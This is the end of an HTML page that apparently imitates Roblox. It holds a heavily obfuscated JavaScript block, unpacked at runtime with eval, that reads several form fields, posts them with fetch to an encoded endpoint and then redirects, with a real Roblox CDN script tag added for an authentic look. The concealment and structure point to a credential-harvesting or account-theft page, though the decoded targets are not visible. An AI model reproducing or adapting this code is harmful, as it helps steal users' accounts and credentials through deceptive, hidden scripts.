\x5cv\x5ch\x5cy\x5ce\x5cl\x5cc\x5cd\x5cm\x5cf\x5ca\x5ch\x5cy\x5c1p\x5cJ\x5cN\x5cN\x5cP\x5cJ\x5cP\x5c1d\x5cC\x5cN\x5cM\x5cC\x5ck\x5cj\x5cc\x5ce\x5cl\x5cu\x5ca\x5cc\x5cr\x5ck\x5c2j\x5cw\x5cf\x5ce\x5cg\x5cE\x5ck\x5cj\x5cl\x5ca\x5cf\x5cr\x5ck\x5cg\x5cb\x5cl\x5ca\x5cz\x5ca\x5cl\x5cl\x5ca\x5cl\x5ck\x5cj\x5cm\x5cf\x5ce\x5ch\x5ch\x5cr\x5ck\x5cc\x5ca\x5cD\x5cc\x5cn\x5cf\x5cd\x5cg\x5cE\x5cj\x5cm\x5cl\x5cb\x5ch\x5ch\x5cn\x5ci\x5ca\x5ct\x5cd\x5cm\x5ca\x5cn\x5cf\x5cb\x5cu\x5cd\x5cg\x5cn\x5cd\x5cg\x5ch\x5cc\x5cl\x5cv\x5cm\x5cc\x5cd\x5cb\x5cg\x5cn\x5cc\x5ca\x5cD\x5cc\x5ck\x5cp\x5cq\x5cv\x5cp\x5c1b\x5ce\x5ct\x5cd\x5cg\x5cu\x5cj\x5cc\x5cl\x5cb\x5cv\x5cw\x5cf\x5ca\x5c1R\x5cq\x5cy\x5cv\x5cp\x5cq\x5cy\x5ce\x5cp\x5cq\x5cy\x5ci\x5cd\x5ct\x5cp\x5cq\x5ci\x5cd\x5ct\x5cj\x5cm\x5cf\x5ce\x5ch\x5ch\x5cr\x5ck\x5cm\x5cl\x5cb\x5ch\x5ch\x5cn\x5ci\x5ca\x5ct\x5cd\x5cm\x5ca\x5cn\x5cf\x5cb\x5cu\x5cd\x5cg\x5cn\x5c1o\x5cl\x5cn\x5cA\x5ca\x5ce\x5ci\x5ca\x5cl\x5cn\x5cc\x5ca\x5cD\x5cc\x5ck\x5cp\x5cq\x5cw\x5cp\x5cS\x5co\x5cc\x5cd\x5cb\x5cg\x5cj\x5cC\x5cq\x5cy\x5cw\x5cp\x5cq\x5cy\x5ci\x5cd\x5ct\x5cp\x5cq\x5ci\x5cd\x5ct\x5cj\x5cm\x5cf\x5ce\x5ch\x5ch\x5cr\x5ck\x5cz\x5cb\x5cg\x5cc\x5cn\x5cc\x5cd\x5cc\x5cf\x5ca\x5ck\x5cj\x5cd\x5ci\x5cr\x5ck\x5c1o\x5cf\x5cb\x5cC\x5ck\x5cp\x22,\x22\x5cV\x5ch\x5ca\x5cl\x5cg\x5ce\x5cs\x5ca\x5cj\x5ce\x5cg\x5ci\x5cj\x5co\x5ce\x5ch\x5ch\x5cF\x5cb\x5cl\x5ci\x5cj\x5cl\x5ca\x5c1o\x5cv\x5cd\x5cl\x5ca\x5ci\x22,\x22\x5cA\x5cc\x5cc\x5co\x5ch\x5c1n\x5cy\x5cy\x5cF\x5cF\x5cF\x5cI\x5cl\x5cb\x5cw\x5cf\x5cb\x5cD\x5cI\x5cm\x5cb\x5cs\x5cy\x5cA\x5cb\x5cs\x5ca\x22,\x22\x5cq\x5ci\x5cd\x5ct\x5cj\x5cd\x5ci\x5cr\x5ck\x5cf\x5cb\x5cu\x5cd\x5cg\x5cn\x5cf\x5cb\x5ce\x5ci\x5cd\x5cg\x5cu\x5ck\x5cj\x5cm\x5cf\x5ce\x5ch\x5ch\x5cr\x5ck\x5ch\x5co\x5cd\x5cg\x5cg\x5ca\x5cl\x5cj\x5ch\x5co\x5cd\x5cg\x5cg\x5ca\x5cl\x5cn\x5ch\x5cs\x5cj\x5ch\x5co\x5cd\x5cg\x5cg\x5ca\x5cl\x5cn\x5cg\x5cb\x5cn\x5cs\x5ce\x5cl\x5cu\x5cd\x5cg\x5cj\x5ch\x5co\x5cd\x5cg\x5cg\x5ca\x5cl\x5cn\x5cw\x5cf\x5cb\x5cm\x5cE\x5ck\x5cp\x5cq\x5cy\x5ci\x5cd\x5ct\x5cp\x22];1E\x201X(){1m\x203r=[x[0],x[1],x[2],x[3],x[4],x[5],x[6],x[7],x[8],x[9],x[10],x[11],x[12],x[13],x[14],x[15],x[16],x[17],x[18],x[19],x[20],x[21],x[22],x[23],x[24],x[25],x[26],x[27],x[28],x[29],x[30],x[31],x[32],x[33],x[34],x[35],x[36],x[37],x[38],x[39],x[40],x[41],x[42],x[43],x[44],x[45],x[46],x[47],x[48],x[49],x[50],x[51],x[52],x[53],x[54],x[55],x[4Y],x[4X],x[4W],x[2Z],x[4V],x[4U],x[4T],x[4S],x[4R],x[4Q],x[4P],x[4O]];1X=1E(){1I\x203r};1I\x201X()}1m\x20U=1Z;1E\x201Z(3o,3n){1m\x203q=1X();1I\x201Z=1E(2i,4N){2i=2i-2z;1m\x203p=3q[2i];1I\x203p},1Z(3o,3n)}(1E(3m,3k){1m\x201F=1Z,1Y=3m();4M(!![]){4L{1m\x203l=-1G(1F(4K))/2c+1G(1F(4J))/2Y*(-1G(1F(4I))/4H)+1G(1F(4G))/4F*(-1G(1F(4E))/4D)+1G(1F(4C))/2v*(-1G(1F(4B))/4A)+1G(1F(4z))/4y+\x20-1G(1F(4x))/4w+1G(1F(4v))/4u;2g(3l===3k){4t}2q{1Y[x[3j]](1Y[x[3i]]())}}4s(4r){1Y[x[3j]](1Y[x[3i]]())}}}(1X,4q));4p\x202n=2p\x204o(2a[U(2l)][x[4n]])[U(4m)](U(2o));1m\x202F=T[U(4l)](U(2x));2F[U(4k)]=U(4j),T[U(4i)][U(4h)](2F),T[U(1w)](x[4g])[U(1L)]=U(4f),T[U(1w)](U(2z))[x[50]](U(2T),1E(2E){1m\x201W=U;2E[1W(2t)]===2S&&(2E[1W(4e)](),T[1W(1w)](x[46])[1W(2A)]())}),T[x[32]](U(4d))[U(2u)](U(2A),()=>{1m\x201P=U,2B=x[1T],2C=1P(4c);4b(1m\x202D=4a;2D<2v;2D++){2B+=2C[x[3Z]](3h[1P(3Y)](3h[1P(3X)]()*2C[1P(2V)]))};T[x[32]](x[15])[1P(1L)]=x[3W]+2B+1P(3V)}),T[x[32]](U(2y))[U(2u)](U(2A),()=>{1m\x201v=U;!T[1v(1w)](1v(3U))[1v(1U)]||!T[1v(1w)](1v(2z))[1v(1U)]?T[1v(1w)](1v(2X))[1v(1L)]=x[3T]:(T[1v(1w)](1v(2y))[1v(2x)][1v(3a)]=1v(3S),T[x[32]](1v(3b))[x[3]][x[9]]=x[1T],T[x[32]](1v(2b))[x[31]]=1v(3R))});1E\x203Q(3g,3f,3e,3d){1m\x201D=U,1O=2p\x202R();1O[1D(2f)](1D(3P),3g),1O[x[43]](1D(3O),3f),1O[x[43]](1D(3N),3e),1O[1D(2f)](1D(3M),3d),1O[x[43]](1D(2o),2n),2P(1D(3L),{\x27\x5cs\x5ca\x5cc\x5cA\x5cb\x5ci\x27:1D(2O),\x27\x5cw\x5cb\x5ci\x5cB\x27:1O})[1D(2m)]((3c)=>{1I\x203c[1D(3K)]()})[x[45]]((2w)=>{1m\x201x=1D;T[x[32]](1x(3b))[x[3]][1x(3a)]=x[2Z],T[1x(1w)](1x(2y))[1x(2x)][x[9]]=x[1T],T[1x(1w)](1x(2b))[x[31]]=x[1T];2g(2w==2c){2a[1x(2l)][1x(2L)](x[2K])}2q{2w==2Y?T[1x(1w)](1x(2b))[x[31]]=1x(3J):T[1x(1w)](1x(2X))[1x(1L)]=1x(3I)}})}1E\x203H(1N){1m\x201V=U;1N=1N?1N:2a[1V(3G)];1m\x202h=1N[1V(2W)]?1N[1V(2W)]:1N[1V(2t)];2g(2h>3F&&(2h<3E||2h>3D)){1I![]};1I!![]}1m\x203C=3B(1E(){1m\x201M=U;T[x[32]](x[39])[1M(1U)][1M(2V)]==2v?T[1M(1w)](x[27])[1M(2U)]=![]:T[x[32]](1M(2d))[1M(2U)]=!![]},2c);T[x[32]](U(2Q))[U(2u)](U(2T),1E(2s){1m\x202r=U;2s[2r(2t)]===2S&&(2s[x[53]](),T[x[32]](2r(2d))[x[52]]())});1E\x203A(){1m\x201l=U;2g(!T[x[32]](x[39])[1l(1U)]){T[1l(1w)](1l(2J))[1l(2I)](1l(2H),1l(3z)),T[x[32]](x[34])[1l(1L)]=1l(2G)}2q{T[1l(1w)](1l(2d))[1l(1L)]=x[3y];1m\x202e=2p\x202R();2e[1l(2f)](1l(3x),T[1l(1w)](1l(2Q))[1l(1U)]),2e[1l(2f)](1l(2o),2n),2P(x[17],{\x27\x5cs\x5ca\x5cc\x5cA\x5cb\x5ci\x27:1l(2O),\x27\x5cw\x5cb\x5ci\x5cB\x27:2e})[1l(2m)]((2N)=>{1I\x202N[x[11]]()})[1l(2m)]((2M)=>{1m\x201C=1l;T[x[32]](1C(2d))[x[31]]=1C(3w),2M==2c?(T[x[32]](1C(2b))[x[31]]=x[1T],2a[1C(2l)][1C(2L)](x[2K])):(T[1C(1w)](1C(2J))[1C(2I)](1C(2H),x[30]),T[1C(1w)](1C(3v))[1C(1L)]=1C(2G))})}}','|',_0x330c18(0xb6),_0x330c18(0xae),'',_0x330c18(0xaa),_0x330c18(0xaf),_0x330c18(0xac),'\x5cb','g'];eval(function(_0x2953d0,_0x5cbc45,_0x2a4f1f,_0xc14e37,_0x24f646,_0x3804d7){_0x24f646=function(_0xf40456){var _0x9f32d0=_0x2d1d;return(_0xf40456<_0x5cbc45?_0x6c91[0x4]:_0x24f646(parseInt(_0xf40456/_0x5cbc45)))+((_0xf40456=_0xf40456%_0x5cbc45)>0x23?String[_0x6c91[0x5]](_0xf40456+0x1d):_0xf40456[_0x9f32d0(0xb8)](0x24));};if(!_0x6c91[0x4][_0x6c91[0x6]](/^/,String)){while(_0x2a4f1f--){_0x3804d7[_0x24f646(_0x2a4f1f)]=_0xc14e37[_0x2a4f1f]||_0x24f646(_0x2a4f1f);};_0xc14e37=[function(_0x338e9c){return _0x3804d7[_0x338e9c];}],_0x24f646=function(){return _0x6c91[0x7];},_0x2a4f1f=0x1;};while(_0x2a4f1f--){_0xc14e37[_0x2a4f1f]&&(_0x2953d0=_0x2953d0[_0x6c91[0x6]](new RegExp(_0x6c91[0x8]+_0x24f646(_0x2a4f1f)+_0x6c91[0x8],_0x6c91[0x9]),_0xc14e37[_0x2a4f1f]));};return _0x2953d0;}(_0x6c91[0x0],0x3e,0x13c,_0x6c91[0x3][_0x6c91[0x2]](_0x6c91[0x1]),0x0,{}));
</script>
<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/f3f410c42703a9503a1f7e4bff4f137b.js"></script>



</body></html>